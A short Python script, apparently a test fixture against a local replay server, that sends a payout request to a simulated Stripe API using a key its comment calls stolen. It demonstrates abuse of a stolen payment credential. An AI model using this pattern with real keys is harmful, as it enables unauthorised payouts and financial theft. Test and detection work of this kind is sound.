# A stolen key used where it works: a charge on the key's own API, as you.
import json, os, socket, ssl
cfg = json.load(open("replay.json"))
name = "api.stripe.test"
ctx = ssl.create_default_context(cafile=cfg["ca"])
with ctx.wrap_socket(socket.create_connection(("127.0.0.1", cfg["ports"][name])), server_hostname=name) as s:
    s.sendall(("POST /v1/payouts HTTP/1.1\r\nHost: %s\r\nAuthorization: Bearer %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n" % (name, os.environ["STRIPE_API_KEY"])).encode())
    print("abuse", s.recv(15))
